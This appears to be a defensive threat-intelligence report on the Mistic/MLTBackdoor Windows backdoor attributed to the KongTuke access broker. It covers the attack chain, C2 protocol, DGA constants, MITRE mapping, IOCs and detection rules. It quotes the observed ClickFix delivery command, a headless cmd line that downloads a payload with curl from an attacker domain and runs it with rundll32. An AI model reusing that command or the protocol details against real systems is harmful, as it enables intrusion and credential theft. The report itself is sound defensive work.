# Mistic Backdoor / MLTBackdoor -- KongTuke Access Broker

**Status:** DRAFT | **Date:** 2026-06-25 | **TLP:** CLEAR | **Analyst:** Actioner CTI

---

## Executive Summary

Mistic (also tracked as MLTBackdoor by Zscaler) is a newly disclosed Windows backdoor linked to the financially motivated initial access broker (IAB) tracked as **KongTuke** (aliases: Woodgnat, 404 TDS, Chaya_002, LandUpdate808, TAG-124). First observed in April 2026, Mistic represents a purpose-built tool designed for long-term, low-visibility network access that is subsequently sold to ransomware affiliates. The backdoor employs DLL side-loading via a legitimate Microsoft Defender executable (`MpExtMs.exe`), heavy obfuscation through Mixed Boolean-Arithmetic (MBA) and Control Flow Flattening (CFF), a custom encrypted C2 protocol with ECDH key exchange over TLS, and a deterministic date-based domain generation algorithm (DGA). Mistic has been deployed alongside ModeloRAT in campaigns targeting insurance, education, IT, and professional services sectors.

## Sources

| Source | Publisher | URL |
|--------|-----------|-----|
| Backdoor.Mistic: New Backdoor May be Linked to Ransomware Access Broker | Symantec / Broadcom | [security.com](https://www.security.com/threat-intelligence/new-mistic-backdoor-modelorat) |
| Technical Analysis of MLTBackdoor | Zscaler ThreatLabz | [zscaler.com](https://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor) |
| New Mistic Backdoor Linked to KongTuke | The Hacker News | [thehackernews.com](https://thehackernews.com/2026/06/new-mistic-backdoor-linked-to-kongtuke.html) |
| Stealthy Mistic backdoor linked to ransomware access broker KongTuke | BleepingComputer | [bleepingcomputer.com](https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/) |
| MLTBackdoor DGA Tool | Zscaler ThreatLabz GitHub | [github.com](https://github.com/ThreatLabz/tools/tree/main/mltbackdoor) |

## Threat Actor Profile

| Attribute | Details |
|-----------|---------|
| **Primary Name** | KongTuke |
| **Aliases** | Woodgnat, 404 TDS, Chaya_002, LandUpdate808, TAG-124 |
| **Classification** | Initial Access Broker (IAB) |
| **Motivation** | Financial -- sells enterprise network access to ransomware affiliates |
| **Active Since** | May 2024 |
| **Associated Ransomware** | Qilin, Interlock, Rhysida, Akira, 8Base, Black Basta |
| **Targeted Sectors** | Insurance, Education, IT Services, Professional Services |

## Attack Chain

```
1. Initial Access (ClickFix/CrashFix/FileFix/Teams social engineering)
      |
2. conhost.exe --headless -> cmd -> curl downloads archive
      |
3. Archive extracted: MpExtMs.exe + version.dll + EndpointDlp.dll (+ data.bin)
      |
4. DLL Side-Loading: MpExtMs.exe -> version.dll (hooks GetModuleFileNameW/LoadLibraryW) -> EndpointDlp.dll
      |
5. RC4 decryption of data.bin payload in memory
      |
6. Mistic backdoor active: ECDH key exchange -> AES-256-GCM encrypted C2
      |
7. BOF loading for modular capability expansion
      |
8. Credential theft via fake login screen (.NET DLL: f.dll)
      |
9. Access sold to ransomware affiliates
```

### ClickFix Delivery Command

Observed command line used in ClickFix delivery:

```
"C:\WINDOWS\system32\conhost.exe" --headless cmd /c "md C:\users\<usr>\AppData\Local\Temp\x&curl -skLo
C:\users\<usr>\AppData\Local\Temp\x\t hxxps://rs2y15sungu[.]com/d&pushd
C:\users\<usr>\AppData\Local\Temp\x&tar xf t&del t&rundll32 endpointdlp.dll,#2"
```

## Technical Analysis

### DLL Side-Loading Chain

- **MpExtMs.exe** -- Legitimate, signed Microsoft Defender executable used as the sideload host
- **version.dll** -- Malicious loader that hooks `GetModuleFileNameW` (path redirection to legitimate `mpextms.exe`) and `LoadLibraryW` (forces loading of malicious `EndpointDlp.dll`)
- **EndpointDlp.dll** -- The Mistic/MLTBackdoor payload; name mimics Microsoft endpoint security tooling

### Obfuscation

- **Mixed Boolean-Arithmetic (MBA):** ~95% of code consists of noise calculations (e.g., `v275 = 2 * (-163 * v248 - 164 * ~v248) - 328` simplifies to `v275 = 2 * v248`)
- **Control Flow Flattening (CFF):** Replaces `if/else` with `while(1){ switch(state) { ... }}` constructs; state values XOR'd at stack offsets
- **Stack-based strings:** Constructed byte-by-byte at runtime within flattened state machine, defeating FLOSS analysis

### C2 Communication Protocol

| Property | Value |
|----------|-------|
| **Transport** | TLS on port 443 |
| **URI Path** | `/api/v1/telemetry` |
| **User-Agent** | `Microsoft-Delivery-Optimization/10.1` |
| **Key Exchange** | ECDH (NIST P-256) |
| **Session Encryption** | AES-256-GCM with 12-byte random nonce |
| **Key Derivation** | SHA256(ECDH_result \|\| client_pubkey \|\| server_pubkey) |
| **Protocol Magic** | `0x014D4C54` (`\x01MLT`) |

#### Packet Header Structure

```c
struct mlt_packet_header {
   uint32_t magic;           // 0x014D4C54 (\x01MLT)
   uint32_t session_id;      // 4 random bytes via BCryptGenRandom
   uint32_t msg_type;
   uint32_t payload_len;
   uint8_t  nonce[12];
   uint8_t  unknown[4];
};
```

#### Message Types

| Value | Direction | Purpose |
|-------|-----------|---------|
| 1 | Client->Server | Host check-in |
| 2 | Server->Client | BOF task delivery |
| 3 | Server->Client | Sleep command |
| 4 | Server->Client | Exit process |
| 5 | Client->Server | Command result |
| 6 | Both | ECDH key exchange |
| 7 | Server->Client | Download file |
| 8 | Client->Server | File data |
| 9 | Server->Client | Upload file |
| 11 | Server->Client | Directory listing command |
| 12 | Client->Server | Directory listing response |
| 13 | Server->Client | Delete command |
| 14 | Server->Client | Rename command |
| 15 | Server->Client | Mkdir command |
| 16 | Client->Server | BOF stdout |

### Domain Generation Algorithm (DGA)

- **Type:** Deterministic, date-based (one domain per day)
- **Algorithm:** Linear Congruential Generator (LCG)
- **Constants:** Multiplier=`0x0019660D`, Increment=`0x3C6EF35F`
- **Seed:** `year * 10000 + month * 100 + day`
- **Domain Length:** 11 characters (alphanumeric a-z, 0-9)
- **TLD:** `.com`
- **Reference Implementation:** [ThreatLabz GitHub](https://github.com/ThreatLabz/tools/tree/main/mltbackdoor)

### API Resolution

- **DJB2 hashing** used to resolve API functions at runtime (normal, lowercase, and beacon-prefixed variants)
- **Indirect system calls** (Hell's Gate style): Builds runtime table mapping 31 `Nt*` API hashes to SSN and syscall gadget addresses

### Anti-Analysis Checks (10-bit bitmask)

| Bit | Check |
|-----|-------|
| 0x001 | Hypervisor CPUID (VMware, VBox, Xen, KVM) |
| 0x002 | Hyper-V / VBS check |
| 0x004 | RDTSC timing check |
| 0x008 | Debugger (NtQueryInformationProcess + ProcessDebugPort) |
| 0x010 | Process enumeration with SHA256 hashed names |
| 0x020 | Window title check (x64dbg, windbg, ida, wireshark, etc.) |
| 0x040 | Sandbox driver check (vbox, vmci, vmhgfs, virtio, xenbus) |
| 0x080 | RAM < 2GB |
| 0x100 | Single CPU |
| 0x200 | Uptime < 5 minutes |

### Beacon Object File (BOF) Loader

Supports standard Cobalt Strike-compatible BOF API (BeaconDataParse, BeaconPrintf, BeaconOutput) plus 19 extended NT API wrappers (BeaconNtAllocateVirtualMemory, BeaconNtCreateFile, etc.), enabling fileless post-exploitation.

### Associated Tools (KongTuke/Woodgnat Toolset)

- **ModeloRAT** -- Python-based RAT with RC4-encrypted C2; deployed alongside Mistic
- **GateKeeper** -- Encrypted .NET payload
- **MintsLoader** -- Secondary loader
- **D3F@ck Loader** -- Secondary loader
- **NexShield** -- Fake browser extension
- **Credential Stealer** -- .NET DLL (`f.dll`) displaying fake Windows login screen

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Details |
|--------|-----------|----|---------|
| Initial Access | Phishing | T1566 | ClickFix/CrashFix/FileFix social engineering |
| Execution | User Execution: Malicious File | T1204.002 | User pastes and executes malicious command |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | conhost --headless -> cmd delivery |
| Execution | System Services: Service Execution | T1569.002 | rundll32 endpointdlp.dll,#2 |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | HKCU Run keys masquerading as AnyDesk/Splashtop |
| Defense Evasion | Hijack Execution Flow: DLL Side-Loading | T1574.002 | MpExtMs.exe -> version.dll -> EndpointDlp.dll |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | EndpointDlp.dll mimics Microsoft DLP component |
| Defense Evasion | Obfuscated Files or Information | T1027 | MBA, CFF, stack-based strings |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 | 10 anti-analysis checks |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | Kill switch self-deletion |
| Defense Evasion | Signed Binary Proxy Execution: Rundll32 | T1218.011 | rundll32 endpointdlp.dll,#2 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS/TLS C2 with custom binary protocol |
| Command and Control | Dynamic Resolution: Domain Generation Algorithms | T1568.002 | Date-based LCG DGA generating .com domains daily |
| Command and Control | Encrypted Channel: Asymmetric Cryptography | T1573.002 | ECDH P-256 + AES-256-GCM |
| Command and Control | Ingress Tool Transfer | T1105 | BOF delivery and in-memory execution |
| Credential Access | Input Capture: GUI Input Capture | T1056.002 | Fake login screen via f.dll |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | File upload via encrypted C2 |

## Indicators of Compromise

### File Hashes (SHA-256)

| Hash | Description |
|------|-------------|
| `1e41c7bfaa6aa3b93b6cc024274a10e33f3e12fe7c98c1db387ef8927f9d1984` | Backdoor.Mistic / MLTBackdoor stage one loader (endpointdlp.dll) |
| `34d798a6c55e57ed0932b6499f4fbcb5454bdfca903307be101a0594b0ac07bc` | Credential stealer / fake lock screen (f.dll) |
| `3f797a639bc855bc6d5471f327924b62d10900ddec49b970eca6604142bbb4be` | Backdoor.Mistic (aeff97fe.msi) |
| `59e3c4cb06331b4f2d78a9a0592f3747e573bd01c5a7650c26361d1e25520712` | version.dll loader |
| `8c935feec4bd05d5d918df308be417532fb42608fb989a08eab183e0ae699235` | Privilege escalation module (n.dll) |
| `afd5f1ed45a9867daf3bc64152cef460a06b164c8183e490db39146d4749a82c` | Backdoor.Mistic (endpointdlp.dll) |
| `db972979d508e75fe730d3b72c2701470fbdaeaf8ebdd674744754fa44438ca5` | Backdoor.Mistic (endpointdlp.dll) |
| `f591275a8f014b29e567529d67c54eb7bb4473db1c38737d6bfd5b3d52c9344e` | Backdoor.Mistic (48b47c0.msi) |
| `fb3630822b70bacb56aa4cec29b5a0e3e9acb3920809e70310a4003385a6d34a` | Backdoor.Mistic (endpointdlp.dll) |
| `46b2155c1e71b840d4b7a2e94410b89a61e2446523e6f497206d402eb02e0e93` | Archive with stage one loader + encrypted MLTBackdoor |
| `9e52cc90cff150abe21f0a6440e86e0a99ff383b81061b96def8948e21d0ac66` | MLTBackdoor with hardcoded domains + DGA |
| `ced6b0f44410f6133ad63b61e04613a8b56cc3338d7b34497540e9541163e7ec` | MLTBackdoor DGA-only variant |
| `1d09357b6a096fdc35cd5c873eed15665d6b3c879d20c8cf01e6bca0005512cf` | MLTBackdoor DGA-only variant |
| `2cd88d5280a61714836f5f07a16df190911c5b952af2998dbbcda910b3b1c494` | MLTBackdoor hardcoded-domains-only variant |
| `d34e4038c5c80728f9648ba84833f69bc1ccea82e2e8e748b7b7f02fb687b92b` | MLTBackdoor update sideload archive |

### Network Indicators

#### C2 IP Addresses

| IP | Context |
|----|---------|
| 142[.]93[.]242[.]144 | Mistic C2 |
| 144[.]31[.]53[.]78 | Mistic C2 |
| 198[.]13[.]159[.]44 | Mistic C2 |
| 199[.]91[.]221[.]42 | Mistic C2 |

#### C2 and Infrastructure Domains

| Domain | Context |
|--------|---------|
| authorized-logins[.]net | Mistic C2 (subdomains: mail, php, sss) |
| b6w9m2z5x8q1v3k[.]top | DGA-generated domain |
| carrolc[.]com | MLTBackdoor C2 |
| cj06y9v4xab[.]com | Infrastructure |
| cwrtwright[.]com | MLTBackdoor C2 |
| defs[.]updater-worelos[.]com | Mistic C2 |
| ftps[.]upd-domain-goloro[.]com | Mistic C2 |
| grande-luna[.]top | Infrastructure |
| human-check[.]top | Infrastructure |
| mail[.]authorized-logins[.]net | Mistic C2 |
| mailes[.]upd-domain-goloro[.]com | Mistic C2 |
| mails[.]updater-worelos[.]com | Mistic C2 |
| mueleer[.]com | Mistic C2 |
| nano[.]upscale-kolo[.]com | Mistic C2 |
| oeannon[.]com | Mistic C2 |
| php[.]authorized-logins[.]net | Mistic C2 |
| powwowski[.]com | MLTBackdoor update server |
| rotoa-upda-lo[.]com | Mistic C2 |
| rs2y15sungu[.]com | DGA domain / ClickFix delivery |
| sql-updater-service[.]com | Mistic C2 |
| sss[.]authorized-logins[.]net | Mistic C2 |
| thomphon[.]com | MLTBackdoor C2 |
| upd-domain-goloro[.]com | Mistic C2 |
| update[.]update-fall[.]com | Mistic C2 |
| updater-worelos[.]com | Mistic C2 |
| upscale-kolo[.]com | Mistic C2 |
| w3xasv14culvnqj[.]top | DGA-generated domain |

#### Payload URLs

| URL | Context |
|-----|---------|
| hxxp://thomphon[.]com/update[.]msi | MLTBackdoor MSI delivery |
| hxxps://rs2y15sungu[.]com/d | ClickFix payload download |
| hxxps://powwowski[.]com/payloads/update[.]zip | MLTBackdoor update archive |

### File Artifacts

| Filename | Purpose |
|----------|---------|
| MpExtMs.exe | Legitimate Microsoft Defender binary (sideload host) |
| version.dll | Malicious loader (hooks GetModuleFileNameW, LoadLibraryW) |
| EndpointDlp.dll / endpointdlp.dll | Mistic/MLTBackdoor payload |
| data.bin | RC4-encrypted payload blob |
| f.dll | Credential stealer (fake login screen, .NET) |
| n.dll | Privilege escalation module |
| aeff97fe.msi | Mistic MSI package |
| 48b47c0.msi | Mistic MSI package |

### Persistence Artifacts

| Type | Location/Name | Details |
|------|---------------|---------|
| Registry Run Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AnyDesk` | Masquerading as AnyDesk, points to MpExtMs.exe |
| Registry Run Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Splashtop` | Masquerading as Splashtop |
| Registry Run Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Comms` | Masquerading as Comms |
| Startup Folder | Shortcut in startup folder | Alternative persistence |
| Scheduled Task | VBScript launcher | Alternative persistence |

## Detection Rules

### Sigma Rules

**File:** `rules/sigma/2026-06-25-mistic-backdoor-kongtuke.yml`

| # | Rule Title | Compile Status | Confidence | Notes |
|---|-----------|---------------|------------|-------|
| 1 | Mistic Backdoor DLL Side-Loading via MpExtMs.exe | compiled (splunk, logscale) | high | Detects EndpointDlp.dll loaded by MpExtMs.exe from non-standard paths. Caveat: requires Sysmon image load logging (Event ID 7). |
| 2 | Mistic Backdoor ClickFix Delivery Chain | compiled (splunk, logscale) | high | Detects conhost --headless delivery and rundll32 endpointdlp.dll execution. Caveat: conhost --headless alone may fire on legitimate automation. |
| 3 | Mistic Backdoor version.dll Loader Suspicious Load | compiled (splunk, logscale) | high | Detects version.dll loaded from non-system paths by MpExtMs.exe. Caveat: requires Sysmon image load events. |
| 4 | Mistic Backdoor Persistence via Run Key Masquerading | compiled (splunk, logscale) | medium | Detects Run key entries named AnyDesk/Splashtop/Comms pointing to MpExtMs. Caveat: TTP-level detection; may require tuning in environments with legitimate remote access tools. |
| 5 | Mistic Backdoor C2 Communication Pattern | compiled (splunk, logscale) | high (IOC) | Detects known C2 domains and the characteristic User-Agent + URI path combination. Caveat: IOC-based rules have a limited shelf life as infrastructure rotates. |

<!-- audit: Sigma rules validated via `sigma convert --without-pipeline -t splunk` and `-t log_scale`, all five rules converted successfully with exit 0. sigma check failed due to upstream D3FEND ontology fetch error (network/proxy issue), not a rule syntax problem. -->

### YARA Rules

**File:** `rules/yara/2026-06-25-mistic-backdoor-kongtuke.yar`

| # | Rule Name | Compile Status | Confidence | Notes |
|---|-----------|---------------|------------|-------|
| 1 | Mistic_MLTBackdoor_Payload | compiled (yarac exit 0) | high | Detects MLTBackdoor payload via protocol magic bytes, DGA LCG constants, BOF loader hashes, and NT API hashes. Caveat: MBA/CFF obfuscation may cause string-based matches to shift across builds. |
| 2 | Mistic_MLTBackdoor_Loader_VersionDLL | compiled (yarac exit 0) | high | Detects the version.dll loader via hook targets and sideload references. Caveat: requires PE export `GetFileVersionInfoA` which is standard for version.dll proxying. |
| 3 | Mistic_MLTBackdoor_RC4_Encrypted_Payload | compiled (yarac exit 0) | medium | Detects archives containing the sideload triple (MpExtMs.exe, version.dll, EndpointDlp.dll). Caveat: filename-based detection in archives; determined actor could rename components. |
| 4 | Mistic_MLTBackdoor_Hashes | compiled (yarac exit 0) | high | Detects embedded SHA256 hashes of analysis tool process names used for anti-analysis. Caveat: partial hash matching (first 16 bytes); other malware families may use similar anti-analysis lists. |

<!-- audit: All 4 YARA rules compiled successfully with `yarac /tmp/actioner/mistic-yara.yar /dev/null` exit code 0. Rules require the `pe` module. -->

### Suricata Rules

**File:** `rules/suricata/2026-06-25-mistic-backdoor-kongtuke.rules`

| # | SID | Rule Summary | Compile Status | Confidence | Notes |
|---|-----|-------------|---------------|------------|-------|
| 1-12 | 2026062501-2026062512 | TLS SNI matches for known C2 domains | compiled (suricata -T exit 0) | high (IOC) | One rule per known C2 domain. Caveat: IOC-based; infrastructure will rotate. |
| 13-16 | 2026062513-2026062516 | C2 IP address matches on TLS port 443 | compiled (suricata -T exit 0) | high (IOC) | Direct IP matching. Caveat: IPs may be reassigned to legitimate services. |
| 17 | 2026062517 | HTTP URI /update.msi payload download | compiled (suricata -T exit 0) | medium | Detects MSI payload retrieval. Caveat: generic URI pattern; combine with domain context. |
| 18 | 2026062518 | HTTP payload download from powwowski[.]com | compiled (suricata -T exit 0) | high (IOC) | Domain + specific path match. Caveat: IOC-based. |

<!-- audit: All 18 Suricata rules validated with `suricata -T -S /tmp/actioner/mistic-suricata.rules -l /tmp/actioner` exit code 0, message "Configuration provided was successfully loaded. Exiting." -->

## Viability Gate Assessment

| Category | Assessment |
|----------|------------|
| **IOC Availability** | PASS -- 15 SHA-256 hashes, 4 IPs, 27+ domains, specific file names, registry paths, and command lines available from two primary vendor reports |
| **Distinctive Artifacts** | PASS -- Protocol magic bytes (`\x01MLT`), specific DGA constants, DJB2 hashed BOF API table, characteristic User-Agent + URI path, unique DLL sideload chain |
| **Production Readiness** | PASS -- IOC-based rules (network, hashes) are immediately deployable; behavioral rules (sideloading, ClickFix chain) require Sysmon or EDR telemetry |
| **Shelf Life** | IOC rules: weeks to months (infrastructure rotates); Behavioral rules: months to years (sideload pattern, protocol constants are structural) |

## Recommendations

1. **Immediate:** Deploy Suricata domain/IP rules and YARA hash-based rules for known samples
2. **Short-term:** Enable Sysmon Event ID 7 (Image Load) to support DLL sideloading detection via Sigma rules
3. **Medium-term:** Implement DGA domain monitoring using the published [ThreatLabz DGA script](https://github.com/ThreatLabz/tools/tree/main/mltbackdoor) to preemptively block future C2 domains
4. **Ongoing:** Monitor for conhost.exe --headless usage and rundll32 loading of EndpointDlp.dll from user-writable paths
5. **Hunt:** Search for MpExtMs.exe in non-standard locations (outside `C:\Program Files\Microsoft\` paths) and registry Run key entries named AnyDesk/Splashtop/Comms pointing to unexpected executables
